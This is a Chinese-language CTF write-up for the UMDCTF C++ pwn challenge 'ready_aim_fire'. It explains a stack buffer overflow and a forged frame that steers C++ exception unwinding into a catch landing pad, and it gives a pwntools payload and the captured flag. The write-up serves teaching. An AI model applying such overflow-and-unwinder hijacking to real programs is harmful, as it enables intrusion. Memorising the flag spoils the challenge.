# ready_aim_fire

## 题目简述

程序把 `Cannon::bufIndex` 和 32 字节 `buf` 放在同一个栈对象中，读取循环却没有在写入前检查边界。超长输入会覆盖 `fire_weapon()` 的保存栈帧和返回地址，随后程序主动抛出 `std::out_of_range`。利用目标不是普通 `ret` 劫持，而是伪造一个能被 C++ 异常展开器识别的调用帧，让异常落入 `direct_hit()` 的 catch landing pad 并打印 flag。

## 解题过程

`fire()` 对换行前的每个字符都执行：

```cpp
buf[bufIndex++] = c;
```

直到整个输入读完后才检查 `bufIndex >= 32`，因此检查发生得太晚。`Cannon` 位于 `fire_weapon` 的 `rbp - 0x30`，其中 `buf` 从对象偏移 4 开始，也就是 `rbp - 0x2c`。从 `buf` 起点到保存的 RBP 正好是 $0x2c=44$ 字节，再往后 8 字节便是保存的返回地址。

`main` 还主动输出局部变量 `target_assist` 的地址。反汇编可见它位于 `main` 的 `rbp - 0x14`，因此：

$$
\text{main\_rbp}=\&\text{target\_assist}+0x14
$$

将 `fire_weapon` 的保存 RBP 覆盖为这个值，可以为后续异常展开提供有效的上层栈框架。

二进制中的 `direct_hit()` 会自行抛出 `std::exception`，其地址 `0x402547` 是 catch 对应的 landing pad：该路径调用 `__cxa_begin_catch`，打印 `Direct hit!`，再调用 `print_flag()`。把 `fire_weapon` 的保存返回地址伪造成 `0x402547` 后，异常展开器会把该层识别为 `direct_hit` 的异常处理区域，并把 `Cannon::fire()` 抛出的 `out_of_range` 交给这里处理。

完整 payload 为：

```python
elf = ELF("./ready_aim_fire")
io = process(elf.path)

io.recvuntil(b"cannon!\n")
target_assist = int(io.recvline(), 16)

payload = b"A" * 44
payload += p64(target_assist + 0x14)
payload += p64(0x402547)
io.sendline(payload)
print(io.recvall().decode())
```

官方 `solve.py` 注释中还写有 `0x4012e4 works`，但该地址不属于当前仓库二进制中的 `print_flag()`；当前符号地址是 `0x4023e6`。这是旧构建遗留注释，不能据此解释现有附件。

成功进入 landing pad 后程序直接输出：

```text
UMDCTF{h0p3fu11y_th3_c++_pwn_w4snt_t00_h0rr1bl3}
```

## 方法总结

本题利用了“事后边界检查”与 C++ 异常展开的组合。44 字节偏移负责伪造 `fire_weapon` 栈帧，题目泄露负责恢复 `main` 的 RBP，而 landing pad 地址让展开器把异常交给本不在调用链上的 `direct_hit`。分析这类题时要同时查看普通反汇编、`.eh_frame` 和 LSDA 语义，不能把所有覆盖返回地址的题都套成 ret2win。
